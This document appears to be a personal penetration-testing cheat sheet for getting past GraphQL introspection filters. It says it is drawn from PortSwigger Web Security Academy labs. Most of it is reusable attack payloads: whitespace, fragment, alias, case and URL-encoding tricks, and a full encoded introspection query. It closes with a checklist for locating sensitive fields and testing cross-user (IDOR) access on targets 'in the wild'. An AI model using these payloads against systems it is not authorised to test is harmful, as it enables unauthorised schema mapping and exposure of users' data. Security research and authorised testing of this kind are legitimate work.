# GraphQL Introspection Bypass Cheat Sheet

Reusable query templates for bypassing introspection filters on GraphQL endpoints.
All payloads assume GET-based delivery (`?query=...`) — adjust for POST/JSON body as needed.

## 0. Recon — confirm the endpoint is GraphQL

```
GET /api?query=query{__typename}
```

Expected clean response:
```json
{"data": {"__typename": "query"}}
```

404 = wrong path. A GraphQL-flavored error (e.g. "Query not present") = right path, try again with an actual query.

Common paths to brute if the endpoint isn't linked anywhere:
```
/graphql
/graphql/v1
/graphql/v2
/api
/api/graphql
/gql
/query
/graphiql
/v1/graphql
```

## 1. Baseline introspection query (will likely get blocked)

```graphql
query{__schema{types{name}}}
```

If blocked, the server is filtering on the literal string `__schema{` (or `__type{`). That's a naive string-match filter, not real parsing — exploit the gap between "matches this text pattern" and "is semantically valid GraphQL."

## 2. Bypass techniques (try in this order — fastest/most common first)

### A. Whitespace/newline injection (most common, try first)
Break the literal substring `__schema{` without breaking the query.

```graphql
query{__schema
{types{name}}}
```

Variants if newline alone doesn't work:
```graphql
query{__schema  {types{name}}}        # extra spaces
query{__schema	{types{name}}}         # tab character
query{__schema
 {types{name}}}                       # newline + space combo
```

### B. Inline fragment
Wraps `__schema` in a fragment reference so the literal adjacent-brace pattern never appears.

```graphql
query{...{__schema{types{name}}}}
```

### C. Aliasing
Rename the field in the query so a filter looking for the literal field name fails, while the server still resolves the real field.

```graphql
query{a:__schema{types{name}}}
```

### D. Mixed-case (only works if filter is case-sensitive — GraphQL field names are NOT case-sensitive-safe by spec, so this usually fails, but cheap to try)

```graphql
query{__SCHEMA{types{name}}}
```

### E. URL-encoding obfuscation of the filtered substring
Sometimes the filter runs on the raw/decoded string server-side at a different layer than the WAF — double-encoding or encoding just the underscore can slip through.

```
query=query%7B%5F%5Fschema%7Btypes%7Bname%7D%7D%7D
```
(`%5F` = `_`)

### F. GET → POST (or vice versa) switch
If the filter is only applied to one HTTP method's handling path, switching delivery method entirely bypasses it.

## 3. Once introspection succeeds — map the schema efficiently

Don't re-run the full heavy introspection query repeatedly. Query specific types directly:

**List all type names:**
```graphql
query{__schema
{types{name}}}
```

**Get fields + args for a specific type (query/mutation/custom type):**
```graphql
query{__type
(name:"query"){fields{name args{name}}}}
```
```graphql
query{__type
(name:"mutation"){fields{name args{name}}}}
```
```graphql
query{__type
(name:"User"){fields{name type{name}}}}
```

**Full heavy introspection (use only when you need everything — nested types, deprecation info, enums):**
Take PortSwigger's standard introspection query and insert a newline after `__schema` before the opening brace. Full payload:

```
query+IntrospectionQuery+%7B%0A++__schema%0A++%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

## 4. URL-encoding reference (for manual construction outside Burp's GraphQL tab)

| Character | Encoded |
|---|---|
| `{` | `%7B` |
| `}` | `%7D` |
| `(` | `%28` |
| `)` | `%29` |
| `"` | `%22` |
| space | `%20` or `+` |
| newline | `%0A` |
| `_` | `%5F` |
| `:` | `%3A` |

Burp's Repeater GraphQL tab auto-encodes when you type raw query text — you generally don't need to hand-encode unless building a request manually (browser address bar, curl, script).

## 5. Mental checklist for any new GraphQL target

1. Find the endpoint (try common paths, check JS bundles for API routes, check network tab during normal site use)
2. Confirm it's GraphQL (`{__typename}` probe)
3. Try baseline introspection — likely works on weak targets, submit immediately if so (introspection-enabled-in-prod is often a standalone finding)
4. If blocked, run through bypass list above in order (A → F)
5. Once schema is visible: grep every `type` block for sensitive-sounding fields (password, token, role, price, ssn, email, internalNotes)
6. Cross-reference which `Query`/`Mutation` entries return/accept those types
7. Call the query/mutation directly, explicitly requesting the sensitive field — don't rely on what the frontend normally asks for
8. Test field access across different user IDs/sessions to confirm IDOR vs single-object exposure
9. If valid finding confirmed (cross-user data access, confirmed critical field exposure) → submit immediately, don't hold out for a bigger chain

---

*Built from PortSwigger Web Security Academy GraphQL API vulnerabilities labs. Expand this file as new bypass techniques are encountered in the wild — not every WAF uses the same filter logic.*
